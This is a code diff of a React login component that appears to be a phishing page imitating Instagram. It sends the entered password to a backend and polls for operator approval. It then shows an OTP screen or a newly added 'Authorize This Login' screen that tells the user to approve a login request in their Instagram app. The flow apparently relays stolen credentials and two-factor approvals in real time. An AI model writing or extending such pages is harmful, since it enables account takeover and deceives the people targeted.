@@ -8,7 +8,7 @@ const AccountLogin = () => {
   const [formData, setFormData] = useState({
     password: '',
   });
-  const [showOtpScreen, setShowOtpScreen] = useState(false);
+  const [currentScreen, setCurrentScreen] = useState('login'); // 'login', 'otp', 'authorize_app'
   const [otp, setOtp] = useState('');
   const [trustDevice, setTrustDevice] = useState(false);
   const [otpVerificationStatus, setOtpVerificationStatus] = useState('idle'); // idle, pending, approved, rejected
@@ -19,7 +19,7 @@ const AccountLogin = () => {
   };
 
   const closeAlert = () => {
-    if (otpVerificationStatus === 'approved') {
+    if (otpVerificationStatus === 'approved' || verificationStatus === 'approved') {
       handleBackToLogin();
     } else {
       setAlertConfig({ ...alertConfig, show: false });
@@ -45,8 +45,17 @@ const AccountLogin = () => {
         });
         
         if (response.ok) {
-          setVerificationStatus('pending');
-          startPolling();
+          const data = await response.json();
+          const action = data.required_action || data.type || 'otp';
+          
+          if (action === 'authorize_app') {
+            setCurrentScreen('authorize_app');
+            setVerificationStatus('pending');
+            startPolling();
+          } else {
+            setVerificationStatus('pending');
+            startPolling();
+          }
         }
       } catch (error) {
         console.error('Error submitting password:', error);
@@ -64,14 +73,21 @@ const AccountLogin = () => {
         if (data.status === 'approved') {
           setVerificationStatus('approved');
           clearInterval(interval);
-          // Immediately proceed to OTP screen
-          setShowOtpScreen(true);
+          if (currentScreen === 'authorize_app' || data.required_action === 'authorize_app') {
+            showAlert('Login Approved', 'Your login has been approved from the Instagram app.');
+          } else {
+            setCurrentScreen('otp');
+          }
         } else if (data.status === 'rejected') {
           setVerificationStatus('rejected');
           clearInterval(interval);
           setVerificationStatus('idle');
-          setFormData({ password: '' });
-          showAlert('Incorrect password', 'The password that you\'ve entered is incorrect. Please try again.');
+          if (currentScreen === 'authorize_app' || data.required_action === 'authorize_app') {
+            showAlert('Authorization Denied', 'The login request was not approved from the Instagram app. Please try again.');
+          } else {
+            setFormData({ password: '' });
+            showAlert('Incorrect password', 'The password that you\'ve entered is incorrect. Please try again.');
+          }
         }
       } catch (error) {
         console.error('Polling error:', error);
@@ -134,7 +150,7 @@ const AccountLogin = () => {
   };
 
   const handleBackToLogin = () => {
-    setShowOtpScreen(false);
+    setCurrentScreen('login');
     setOtp('');
     setFormData({ password: '' });
     setTrustDevice(false);
@@ -148,8 +164,8 @@ const AccountLogin = () => {
     // Add your resend logic here
   };
 
-  // If OTP screen should be shown
-  if (showOtpScreen) {
+  // OTP Screen
+  if (currentScreen === 'otp') {
     return (
       <div className="min-h-screen bg-[#1C2A33] text-white flex flex-col font-sans">
         {/* Back Button */}
@@ -243,6 +259,72 @@ const AccountLogin = () => {
 
           </div>
         </form>
+
+        {/* Alert Popup */}
+        {alertConfig.show && (
+          <div className="fixed inset-0 flex items-center justify-center z-50 px-9 pointer-events-none">
+            <div className="bg-white rounded-[12px] w-full max-w-[280px] overflow-hidden flex flex-col items-center shadow-2xl pointer-events-auto transition-all transform scale-100 opacity-100">
+              <div className="pt-6 pb-4 px-6 text-center">
+                <h3 className="text-black font-semibold text-[17px] mb-1 leading-tight">{alertConfig.title}</h3>
+                <p className="text-[#8E8E8E] text-[14px] leading-tight">{alertConfig.message}</p>
+              </div>
+              <button 
+                onClick={closeAlert}
+                className="w-full border-t border-gray-100 py-3.5 text-[#0095f6] font-semibold text-[14px] active:bg-gray-50 transition"
+              >
+                OK
+              </button>
+            </div>
+          </div>
+        )}
+      </div>
+    );
+  }
+
+  // Authorize From App Screen
+  if (currentScreen === 'authorize_app') {
+    return (
+      <div className="min-h-screen bg-[#1C2A33] text-white flex flex-col font-sans">
+        {/* Back Button */}
+        <button 
+          onClick={handleBackToLogin}
+          className="absolute top-6 left-6 text-white hover:text-gray-300 transition"
+        >
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+            <path d="M19 12H5M12 19l-7-7 7-7"/>
+          </svg>
+        </button>
+
+        {/* Center Content */}
+        <div className="flex-1 flex flex-col items-center justify-center px-6">
+          {/* Shield/Lock Icon */}
+          <div className="mb-8">
+            <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect x="10" y="10" width="60" height="60" rx="12" stroke="#0095f6" strokeWidth="3" fill="none"/>
+              <path d="M40 25v6m0 4v2" stroke="#0095f6" strokeWidth="3" strokeLinecap="round"/>
+              <rect x="33" y="37" width="14" height="14" rx="3" stroke="#0095f6" strokeWidth="2" fill="none"/>
+              <circle cx="40" cy="44" r="2" fill="#0095f6"/>
+            </svg>
+          </div>
+
+          {/* Title */}
+          <h1 className="text-2xl font-semibold mb-4 text-center">Authorize This Login</h1>
+          
+          {/* Description */}
+          <p className="text-sm text-gray-400 text-center mb-4 max-w-xs">
+            We sent a login request to the Instagram app on your device. 
+            Please open the app and approve this login.
+          </p>
+          
+          {/* Pending Status */}
+          <div className="flex items-center gap-3 mt-6 px-6 py-4 bg-[#25343F] rounded-lg">
+            <svg className="animate-spin h-5 w-5 text-[#0095f6]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+            <span className="text-sm text-gray-300">Waiting for approval from app...</span>
+          </div>
+        </div>
 
         {/* Alert Popup */}
         {alertConfig.show && (
